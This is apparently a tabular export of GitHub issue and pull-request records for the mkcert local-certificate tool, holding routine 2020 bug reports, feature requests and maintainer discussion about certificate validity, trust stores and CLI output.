Please feel free to close it.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/306/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/306/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/306/events,https://github.com/FiloSottile/mkcert/issues/306,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/305,734476215,MDU6SXNzdWU3MzQ0NzYyMTU=,305,macOS Big Sur,4745679,closed,FALSE,NA,NA,6,2020-11-02T12:46:23Z,2020-11-28T13:00:45Z,2020-11-28T13:00:45Z,NONE,NA,Apologize while not an issue I wanted to just bring this up. Is there a plan / has there been to test this package on the latest macOS beta for Big Sur? I only ask cause I know there were some issues with Catalina when it first came out off the bat and would love to know if it works with the next update out of the gate or not.,NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/305/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/305/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/305/events,https://github.com/FiloSottile/mkcert/issues/305,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/304,730859693,MDU6SXNzdWU3MzA4NTk2OTM=,304,mkcert silently overwrites CSR file,42373,open,FALSE,NA,NA,1,2020-10-27T21:43:48Z,2020-10-28T00:07:52Z,NA,NONE,NA,"running mkcert 1.4.2.

when using the `-csr` flag, mkcert silently replaces the CSR file `www.example.com.pem` with a file of the same name `www.example.com.pem` that contains the signed certificate. instead of this destructive behaviour, mkcert could exit with an error instead of overwriting.

1. create a CSR file in an external system and place in the current directory
1. name the CSR file `www.example.com.pem`
1. run `mkcert -csr www.example.com.pem`
1. the file `www.example.com.pem` is replaced with the signed cert, and the CSR is destroyed


",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/304/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/304/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/304/events,https://github.com/FiloSottile/mkcert/issues/304,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/303,729099862,MDU6SXNzdWU3MjkwOTk4NjI=,303,Remove codeSigning EKU?,1225294,closed,FALSE,NA,NA,4,2020-10-25T19:55:21Z,2020-10-27T11:34:48Z,2020-10-27T11:34:48Z,OWNER,NA,"@mastahyeti @btoews can you help me remember why in #152 we added the codeSigning EKU when there is an email SAN? How are those related?

https://github.com/FiloSottile/mkcert/blob/a2b1208e9c7d6a9588bce49729cfedbdf9f8be21/cert.go#L96-L98",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/303/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/303/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/303/events,https://github.com/FiloSottile/mkcert/issues/303,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/302,723742195,MDU6SXNzdWU3MjM3NDIxOTU=,302,[feature] add Name Contraint?,3248,open,FALSE,NA,NA,0,2020-10-17T12:02:05Z,2020-10-17T12:02:15Z,NA,NONE,NA,"It would be nice if the CA could be generated with a Name Constraint, so that it can only be used on a specific top-level domain like `.local`.

See https://timothy-quinn.com/name-constraints-in-x509-certificates/",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/302/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/302/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/302/events,https://github.com/FiloSottile/mkcert/issues/302,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/301,718226759,MDU6SXNzdWU3MTgyMjY3NTk=,301,Overly strict checking of CSR header,1210784,closed,FALSE,NA,NA,0,2020-10-09T15:13:20Z,2020-10-25T23:25:33Z,2020-10-25T23:25:33Z,NONE,NA,"Making cert fails for WebSphere initiated request as it has 
-----BEGIN NEW CERTIFICATE REQUEST-----
instead of
-----BEGIN CERTIFICATE REQUEST-----
ERROR: failed to read the CSR: expected CERTIFICATE REQUEST, got NEW CERTIFICATE REQUEST
Issue can be bypassed by editing CSR using editor ",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/301/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/301/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/301/events,https://github.com/FiloSottile/mkcert/issues/301,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/300,717781063,MDU6SXNzdWU3MTc3ODEwNjM=,300,Is this project abandoned?,835733,closed,FALSE,NA,NA,2,2020-10-09T01:38:43Z,2020-10-25T17:09:35Z,2020-10-25T17:09:35Z,NONE,NA,"* There's several pull request pending. Some very useful for common issues with this tool.
* There hasn't been a commit since March, 2020.

@FiloSottile any input? ",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/300/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/300/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/300/events,https://github.com/FiloSottile/mkcert/issues/300,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/299,716986786,MDExOlB1bGxSZXF1ZXN0NDk5NjI4MzQx,299,Update cert.go due to ERR_CERT_VALIDITY_TOO_LONG,13049357,closed,FALSE,NA,NA,0,2020-10-08T03:17:07Z,2020-10-25T23:25:34Z,2020-10-25T23:25:34Z,NONE,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/299/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/299/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/299/events,https://github.com/FiloSottile/mkcert/pull/299,https://api.github.com/repos/FiloSottile/mkcert/pulls/299
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/298,714302428,MDExOlB1bGxSZXF1ZXN0NDk3NDI0NTI0,298,Add output flag for specifying output path.,28337009,closed,FALSE,NA,NA,1,2020-10-04T12:22:27Z,2020-10-25T23:53:34Z,2020-10-25T23:53:34Z,NONE,NA,"Add output flag for specifying output path.
The output flag makes it simpler than specifying the path with cert-file, key-file, p12-file flags.

## Usage

Generate `example.org.pem` and `example.org-key.pem` in `./certs`.
```
mkcert -output ./certs example.org
```
",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/298/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/298/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/298/events,https://github.com/FiloSottile/mkcert/pull/298,https://api.github.com/repos/FiloSottile/mkcert/pulls/298
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/297,708368429,MDU6SXNzdWU3MDgzNjg0Mjk=,297,Installing in Firefox and/or Chrome/Chromium failed - xubunto,31323048,open,FALSE,NA,NA,0,2020-09-24T18:00:54Z,2020-09-24T18:00:54Z,NA,NONE,NA,"mkcert -install
Using the local CA at ""/home/fisa/.local/share/mkcert"" ✨
Installing in Firefox and/or Chrome/Chromium failed. Please report the issue with details about your environment at https://github.com/FiloSottile/mkcert/issues/new 👎
Note that if you never started Firefox and/or Chrome/Chromium, you need to do that at least once",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/297/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/297/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/297/events,https://github.com/FiloSottile/mkcert/issues/297,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/296,705854189,MDU6SXNzdWU3MDU4NTQxODk=,296,Automatic renewal per Acme?,3837238,closed,FALSE,NA,NA,17,2020-09-21T19:22:02Z,2020-10-28T22:46:26Z,2020-10-25T17:17:08Z,NONE,NA,"1. The Readme file doesn't seem to address the issue of expiration date. Please add when these certificates and this CA expire. If the expiration date is less than 10 years, automatic renewal is required, as supported by other Let's Encrypt Acme bots.

====

2. Also, I'm using a very different scheme for secure local servers that, unlike your solution, is compatible with production websites that use cPanel management software, which is very common.

I would like a certbot that copies the remote private key and certificate files from the production computer to the local development computer automatically whenever cPanel updates its secinfo (security information).

My scheme requires manual creation of an unused subdomain ""local.example.com"" on the production computer. cPanel will automatically include this new subdomain name in its secinfo whenever it  auto-updates it.

On the local development server, I make an entry in the HOSTS file so that ""local.example.com"" is mapped to 127.0.0.1 (the loopback address).

So if I open ""local.example.com/my-website"", the browser opens my website securely.

These two steps are very simple, so anyone can do them. They are compliant with all known regulations. yet provide compatible security to development/production server pairs.

But this scheme requires downloading the new secinfo manually about once every 5 months. Computer should do such repetitive tasks!

Thus I need a (Windows in this case) certbot that will automatically detect an expired certificate and download the new secinfo from the production server. Windows can probably do this using powershell and/or the task scheduler, or any of its script languages. However, these are all beyond my knowledge, and that of most developers who want to maintain a local development server that mirrors a remote production server.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/296/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/296/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/296/events,https://github.com/FiloSottile/mkcert/issues/296,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/295,700723097,MDU6SXNzdWU3MDA3MjMwOTc=,295,Installation of root CA for OpenSSL,3698644,closed,FALSE,NA,NA,1,2020-09-14T03:05:56Z,2020-10-25T18:07:25Z,2020-10-25T17:21:42Z,NONE,NA,"👋 This is a follow up to a tweet I made earlier: https://twitter.com/nmdmatt/status/1305206184094445571

Basically, PHP sockets fail to connect to a site using certificates with mkcert. That is because the `openssl.capath` does not contain the mkcert root CA.

",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/295/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/295/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/295/events,https://github.com/FiloSottile/mkcert/issues/295,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/290,695866511,MDU6SXNzdWU2OTU4NjY1MTE=,290,Make the output of `mkcert <name>` less alarming and more explanatory,9762897,closed,FALSE,NA,NA,0,2020-09-08T13:20:52Z,2020-10-25T23:25:34Z,2020-10-25T23:25:34Z,NONE,NA,"Hey @FiloSottile! As discussed:

### Current behaviour
When running `mkcert <name>` without prealably running `mkcert -install`, warnings are displayed.
Example when running `mkcert localhost`:
```
Using the local CA at ""/Users/maudn/Library/Application Support/mkcert"" ✨
Warning: the local CA is not installed in the system trust store! ⚠️
Run ""mkcert -install"" to avoid verification errors ‼️

Created a new certificate valid for the following names 📜
 - ""localhost""

The certificate is at ""./localhost.pem"" and the key at ""./localhost-key.pem"" ✅
```

### Issue with the current behaviour
`Warning`, `... avoid verification errors !!` and the red color of the `!!` may look alarming and make users think that something is wrong and that they _have_ to run `mkcert -install` for their certificates to be properly generated. 
When in fact, running `mkcert <name>` successfully creates a self-signed certificate, which is just fine for some use cases. 
We may want to prevent a developer from running `mkcert -install` as a ""quick fix"" without having the implications in mind.
But the warning definitely is useful to developers planning on using a local root CA.

### New behaviour: proposal
Output when the user runs `mkcert <name>` e.g. `mkcert localhost` (surely this needs rewording, but something along these lines maybe:):
```
Created a new certificate valid for the following names 📜
 - ""localhost""
The certificate is at ""./localhost.pem"" and the key at ""./localhost-key.pem"" ✅

Local CA at ""/Users/maudn/Library/Application Support/mkcert"" but *not* installed.

⚠️ Warning: the certificate will appear as self-signed to browsers because the local CA 
is not installed in the system trust store. 
Browsers may display warnings when using this certificate.
• If this sounds OK, you can proceed.
• If you need a certificate that looks fully valid to browsers, run ""mkcert -install"" to 
install the local CA in the system trust store.
```",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/290/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/290/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/290/events,https://github.com/FiloSottile/mkcert/issues/290,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/286,684942748,MDU6SXNzdWU2ODQ5NDI3NDg=,286,Azure DevOps Pipelines: Installing local CA via PowerShell hangs,4750903,closed,FALSE,NA,NA,4,2020-08-24T20:25:19Z,2020-11-10T19:49:46Z,2020-11-10T19:48:46Z,NONE,NA,"I've installed mkcert in an Azure Pipeline windows VM via Chocolatey. However, installing the local CA via PowerShell hangs. I can't find anything significant in the logs for this pipeline task. I have to manually cancel the run after about 5 minutes.

```
mkcert -install
Created a new local CA at ""/home/circleci/.local/share/mkcert"" 💥 <--- agent hangs right here
```",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/286/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/286/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/286/events,https://github.com/FiloSottile/mkcert/issues/286,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/284,681696743,MDExOlB1bGxSZXF1ZXN0NDcwMDQ0MjA5,284,Build mkcert for arm64 Linux,17739158,closed,FALSE,NA,NA,1,2020-08-19T09:38:26Z,2020-10-26T08:26:15Z,2020-10-25T23:23:21Z,CONTRIBUTOR,NA,There isn't a build for arm64 Linux at the moment. This PR adds support for arm64. More details: https://github.com/golang/go/wiki/GoArm,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/284/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/284/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/284/events,https://github.com/FiloSottile/mkcert/pull/284,https://api.github.com/repos/FiloSottile/mkcert/pulls/284
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/283,672973706,MDU6SXNzdWU2NzI5NzM3MDY=,283,Very slow performance of mkcert -CAROOT on fish shell,1425304,open,FALSE,NA,NA,2,2020-08-04T17:59:08Z,2020-10-26T15:56:42Z,NA,NONE,NA,"```
❯ time mkcert -CAROOT                                                                                           10:57:28
/Users/myuser/Library/Application Support/mkcert

________________________________________________________
Executed in  851.95 millis    fish           external
   usr time  483.51 millis  109.00 micros  483.40 millis
   sys time  336.20 millis  460.00 micros  335.74 millis

```

Not really sure what is going on but taking almost 500ms to return a directory path seems really slow. 

Any thoughts on this?",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/283/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/283/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/283/events,https://github.com/FiloSottile/mkcert/issues/283,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/282,669538680,MDU6SXNzdWU2Njk1Mzg2ODA=,282,Remove print of CA location?,9762897,closed,FALSE,NA,NA,2,2020-07-31T08:03:39Z,2020-10-25T23:25:33Z,2020-10-25T23:25:33Z,NONE,NA,"When creating the local root CA, its location is printed in the terminal:
`Using the local CA at ""/Users/<username>/Library/Application Support/mkcert""`
This makes the local root CA easier to find for an attacker.
Once they would get hold of this, the attacker could make a certificate for all websites, that would be trusted by the developer's system.

=> Should this indication be removed? 

This would not be a mitigation, but an upgrade. 
Not sure about the pitfalls (and risks?) of doing this.

Discussed with @FiloSottile. ",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/282/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/282/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/282/events,https://github.com/FiloSottile/mkcert/issues/282,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/281,664575754,MDU6SXNzdWU2NjQ1NzU3NTQ=,281,Output of `-uninstall` is inconsistent,1132816,open,FALSE,NA,NA,0,2020-07-23T15:32:04Z,2020-07-23T15:32:04Z,NA,NONE,NA,"When installing the local CA into the system using `mkcert -install`  all entities for which it is installed are reported:

```
The local CA is now installed in the system trust store! ⚡️
The local CA is now installed in the Firefox trust store (requires browser restart)! 🦊
The local CA is now installed in Java's trust store! ☕️
```

When uninstalling the local CA from the system using `mkcert -uninstall` the output is only

```
The local CA is now uninstalled from the system trust store(s)! 👋
```

It would be better if the output of `-uninstall` lists all entities it uninstalls the local CA from like `-install` does. Otherwise, the output casts doubt if it has really been removed from the Java trust store and the browser trust stores.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/281/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/281/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/281/events,https://github.com/FiloSottile/mkcert/issues/281,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/280,664135483,MDExOlB1bGxSZXF1ZXN0NDU1NDI2MTgw,280,Support camel-case name variant of Firefox Dev Edition,4648467,closed,FALSE,NA,NA,1,2020-07-23T00:57:40Z,2020-10-25T23:24:54Z,2020-10-25T23:24:54Z,CONTRIBUTOR,NA,The latest versions of Firefox Developer Edition on macOS seem to use upper camel case naming for the app. This ensures that the CA will be added to the Firefox trust store if using recent versions of FF Dev Edition.,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/280/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/280/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/280/events,https://github.com/FiloSottile/mkcert/pull/280,https://api.github.com/repos/FiloSottile/mkcert/pulls/280
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/279,660510061,MDU6SXNzdWU2NjA1MTAwNjE=,279,Did everything but still have warning about certificate,46846027,closed,FALSE,NA,NA,2,2020-07-19T01:47:50Z,2020-10-25T18:07:34Z,2020-10-25T17:57:20Z,NONE,NA,"I did every step from different websites like here: https://kifarunix.com/how-to-create-self-signed-ssl-certificate-with-mkcert-on-ubuntu-18-04/
or here: https://jonathanbossenger.com/setting-up-trusted-ssl-certificates-for-local-development-using-mkcert-on-ubuntu-18-04-with-apache/
or here: https://linoxide.com/linux-how-to/mkcert-localhost-ssl-certificates-linux/
But i still get warning about certificate...
Is it possible to trust this certificate to whole local subnet like 192.168.0.0/24?
",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/279/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/279/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/279/events,https://github.com/FiloSottile/mkcert/issues/279,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/278,660040333,MDExOlB1bGxSZXF1ZXN0NDUxODMxMTIw,278,Adds support to pass CA name,306691,closed,FALSE,NA,NA,2,2020-07-18T09:40:36Z,2020-10-25T18:12:05Z,2020-10-25T18:12:05Z,NONE,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/278/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/278/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/278/events,https://github.com/FiloSottile/mkcert/pull/278,https://api.github.com/repos/FiloSottile/mkcert/pulls/278
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/277,659969678,MDU6SXNzdWU2NTk5Njk2Nzg=,277,Share crt and Root CA,306691,closed,FALSE,NA,NA,0,2020-07-18T07:14:48Z,2020-10-25T18:07:46Z,2020-07-18T09:26:31Z,NONE,NA,How to share Root CA with other developers in the team? ,NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/277/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/277/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/277/events,https://github.com/FiloSottile/mkcert/issues/277,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/276,651683043,MDU6SXNzdWU2NTE2ODMwNDM=,276,"398-day limit on cert lifespan starting Sept 1, 2020 - will this break mkcert?",112444,closed,FALSE,NA,NA,8,2020-07-06T16:49:01Z,2020-10-25T23:05:18Z,2020-10-25T23:04:25Z,NONE,NA,"I know there's been lots of talk about this but I don't see an open issue. As of September 1, 2020, 

> Starting with September 1, 2020, browsers and devices from Apple, Google, and Mozilla will show errors for new TLS certificates that have a lifespan greater than 398 days

([zdnet article](https://www.zdnet.com/article/apple-strong-arms-entire-ca-industry-into-one-year-certificate-lifespans/))

mkcert certs have an 11-year lifespan, but the issue date is May 31, 2019. IIRC the issue date dodged another clamp-down last year, and certs issued before June 1, 2019 were allowed. 

But I'm concerned and would like reassurance that mkcert certs will work OK in Fall, 2020.

Thanks!",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/276/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/276/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/276/events,https://github.com/FiloSottile/mkcert/issues/276,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/275,650346673,MDU6SXNzdWU2NTAzNDY2NzM=,275,Firefox not working,288542,closed,FALSE,NA,NA,4,2020-07-03T05:09:45Z,2020-10-25T18:08:15Z,2020-07-03T05:25:22Z,NONE,NA,"All other browsers on my system work, but Firefox steadfastly refuses to. I have verified the following:
1. nss is installed (and was when I generated the certs a month ago)
2. The root CA was in the trusted authorities perms of Firefox (and I have uninstalled/reinstalled serveral times to no avail)
3. Chrome, Safari, Edge all work fine
4. I am on Mac OS 10.5.5
5. My Firefox version is 78.0.1 (64-bit)
6. Root CA is trusted in my login and system keychain

Error message given is:

    Secure Connection Failed

    An error occurred during a connection to stephen.xxxx.xxxx.net. PR_CONNECT_RESET_ERROR

    The page you are trying to view cannot be shown because the authenticity of the received data could not be verified.
    Please contact the website owners to inform them of this problem.

I have tried everything I can think of, any suggestions?",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/275/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/275/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/275/events,https://github.com/FiloSottile/mkcert/issues/275,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/274,647639145,MDExOlB1bGxSZXF1ZXN0NDQxNjI3ODE3,274,Don't set server usage for client certificates,6198562,open,FALSE,NA,NA,1,2020-06-29T20:20:14Z,2020-07-28T21:50:42Z,NA,NONE,NA,Closes #273 ,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/274/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/274/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/274/events,https://github.com/FiloSottile/mkcert/pull/274,https://api.github.com/repos/FiloSottile/mkcert/pulls/274
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/273,647636289,MDU6SXNzdWU2NDc2MzYyODk=,273,Client certs also specify Server usage ,6198562,open,FALSE,NA,NA,2,2020-06-29T20:15:44Z,2020-10-25T22:09:35Z,NA,NONE,NA,Using the `-client` flag results in a certificate valid for both Client and Server usage.  This can lead to some unexpected validation scenarios.  I think they should be mutually exclusive in practice.,NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/273/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/273/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/273/events,https://github.com/FiloSottile/mkcert/issues/273,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/272,643053878,MDU6SXNzdWU2NDMwNTM4Nzg=,272,Unclear instruction - what to do?,15650524,closed,FALSE,NA,NA,1,2020-06-22T13:02:58Z,2020-10-25T18:05:09Z,2020-10-25T18:05:05Z,NONE,NA,"Hi! I work on Win7x64. Under admin I run `mkcert -install`. All I got is just `rootCA-key.pem` and `rootCA.pem` in `c:\Users\itshim\AppData\Local\mkcert`. How these files will work if they just lie in a folder? I tried to search new certificate in Windows storage, but nothing. `Personal`, `Trusted Root Certification Authorities`, `Trusted Publishers`, `Third-Party Root Certification Authorities` - nobody has new certificate (despite Windows said it imports certificate). Hell, I even don't know what's the name of the certificate!

Can you please be more detailed what and where is stored? I try to make web server, but browser cannot establish `https` because no certificate.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/272/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/272/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/272/events,https://github.com/FiloSottile/mkcert/issues/272,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/271,642978058,MDExOlB1bGxSZXF1ZXN0NDM3ODY2Mjc5,271,Set certificate validity to 1 year to avoid issues with Chrome/Safari,5706843,closed,FALSE,NA,NA,3,2020-06-22T11:10:19Z,2020-10-25T23:25:34Z,2020-10-25T23:25:34Z,NONE,NA,"Set certificate validity to 1 year, to avoid clashing with more restrictive browsers (Apple is limiting to 1 year)",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/271/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/271/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/271/events,https://github.com/FiloSottile/mkcert/pull/271,https://api.github.com/repos/FiloSottile/mkcert/pulls/271
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/270,638462736,MDU6SXNzdWU2Mzg0NjI3MzY=,270,ERROR: failed to create the CAROOT: mkdir /mnt/c/Users/YOUR_WINDOWS_USERNAME: permission denied - on Ubuntu 20.04 on WSL2,1080646,closed,FALSE,NA,NA,2,2020-06-15T00:22:55Z,2020-06-15T08:55:22Z,2020-06-15T08:50:02Z,NONE,NA,"If I run 
`mkcert -install`

I get:

`ERROR: failed to create the CAROOT: mkdir /mnt/c/Users/YOUR_WINDOWS_USERNAME: permission denied`

How can I get mkcert -install to run correctly please?

In trying to solve the issue, I did:
```
$ which mkcert
/home/linuxbrew/.linuxbrew/bin/mkcert
```

And then tried

$ sudo su root
$ /home/linuxbrew/.linuxbrew/bin/mkcert

which results in Creating the local CA at ""/root/.local/share/mkcert""

But I don't think this is the right place for the CA, it should be somewhere in the home folder of my non-root user.

Related issue - I'm doing mkcert -install as part of setting up ddev on Ubuntu 20.04 wsl2
https://github.com/drud/ddev/issues/2311


",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/270/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/270/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/270/events,https://github.com/FiloSottile/mkcert/issues/270,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/269,638156628,MDU6SXNzdWU2MzgxNTY2Mjg=,269,Create certificate with multiple Subject Alternative Names from file,410736,closed,FALSE,NA,NA,1,2020-06-13T12:48:57Z,2020-10-25T18:07:10Z,2020-10-25T18:07:03Z,NONE,NA,"Hi,

would it be possible to load the list of names directly from a text file?

i tried this way but it generates an error:

```
mkcert $(cat /etc/hosts | sed '/#/d' | awk '{ print $2 }' | tr ""\n"" "" "")
-bash: /usr/bin/mkcert: Argument list too long
```

Thanks.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/269/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/269/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/269/events,https://github.com/FiloSottile/mkcert/issues/269,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/268,636223839,MDU6SXNzdWU2MzYyMjM4Mzk=,268,Get Error when executing the example,5887203,closed,FALSE,NA,NA,1,2020-06-10T12:56:38Z,2020-06-10T13:01:05Z,2020-06-10T13:01:04Z,NONE,NA,"Hi, I just run the example in the README, but an error has happend.
```shell
server/sslcerts » mkcert example.com ""*.example.com"" example.test localhost 127.0.0.1 ::1
Using the local CA at ""/home/kevin/.local/share/mkcert"" ✨
Warning: the local CA is not installed in the system trust store! ⚠️
Run ""mkcert -install"" to avoid verification errors ‼️
ERROR: failed to save certificate key: open ./example.com+5-key.pem: no such file or directory
```

my OS is archlinux
and mkcert is installed from pacman",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/268/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/268/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/268/events,https://github.com/FiloSottile/mkcert/issues/268,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/267,636084865,MDU6SXNzdWU2MzYwODQ4NjU=,267,Release without version number in file names,1824582,open,FALSE,NA,NA,2,2020-06-10T09:20:55Z,2020-06-11T10:28:32Z,NA,NONE,NA,"Please, consider using names without version numbers in the files that get published as GitHub Release assets (https://github.com/FiloSottile/mkcert/releases).

GitHub has a very nice feature that converts this URL:
```
https://github.com/FiloSottile/mkcert/releases/latest/download/${FILENAME}
```

to this other one:
```
https://github.com/FiloSottile/mkcert/releases/download/v${LATEST_VERSION}/${FILENAME}
```

